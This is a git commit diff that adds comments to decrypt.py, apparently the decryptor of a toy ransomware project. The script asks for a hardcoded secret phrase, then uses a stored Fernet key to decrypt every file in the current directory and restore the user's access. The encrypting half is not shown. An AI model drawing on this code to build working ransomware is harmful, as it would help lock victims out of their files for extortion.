a4af880b49993077922af65bbcf399c5e6b267ab
Shivam <108695565+Shivam7679@users.noreply.github.com>
2023-08-27 17:14:24 +0530

    Update decrypt.py

--- decrypt.py
+++ decrypt.py
@@ -7,16 +7,16 @@ for file in os.listdir():
 	files.append(file)
 print (files)
 with open("actual_key.key","rb") as actual_key:
-	a = actual_key.read()
-secret= "save me!"
+	a = actual_key.read()						#put the key in the variable a
+secret= "save me!"							#setting a phrase to get as input from the user
 user_input= input("Enter the secret: ")
-if user_input == secret:
+if user_input == secret:						#if the phrase matches
 	for file in files:
 		with open(file,"rb") as file1:
 			content= file1.read()
-		decrypt_content= Fernet(a).decrypt(content)
+		decrypt_content= Fernet(a).decrypt(content)		#derypt the content which was encrypted
 		with open(file,"wb") as file1:
-			file1.write(decrypt_content)
+			file1.write(decrypt_content)			#throw the decrypted content and let the user access their files
 	print("Enjoy your access again!")
 else:
 	print("Sorry, Wrong credentials!")
